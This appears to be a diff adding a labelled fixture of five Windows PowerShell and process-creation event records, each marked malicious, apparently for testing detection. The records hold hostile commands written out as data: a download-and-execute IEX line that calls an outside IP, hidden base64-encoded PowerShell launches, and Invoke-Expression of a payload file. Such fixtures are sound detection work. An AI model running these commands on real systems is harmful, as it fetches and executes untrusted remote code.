@@ -1,0 +1,7 @@
+[
+  { "TimeCreated": "2026-01-05T09:01:10Z", "Id": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Label": "malicious", "Message": "Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.7/a.ps1')" },
+  { "TimeCreated": "2026-01-05T09:04:22Z", "Id": 4688, "ProviderName": "Microsoft-Windows-Security-Auditing", "Label": "malicious", "Message": "A new process has been created: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" },
+  { "TimeCreated": "2026-01-05T09:07:41Z", "Id": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Label": "malicious", "Message": "Creating Scriptblock text (1 of 1): [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p))" },
+  { "TimeCreated": "2026-01-05T09:11:03Z", "Id": 4104, "ProviderName": "Microsoft-Windows-PowerShell", "Label": "malicious", "Message": "Creating Scriptblock text (1 of 1): Invoke-Expression (Get-Content .\\payload.txt -Raw)" },
+  { "TimeCreated": "2026-01-05T09:15:55Z", "Id": 4688, "ProviderName": "Microsoft-Windows-Security-Auditing", "Label": "malicious", "Message": "A new process has been created: powershell.exe -EncodedCommand JABjACAAPQAgACcAaAB0AHQAcAA6AC8ALwAxADAA" }
+]
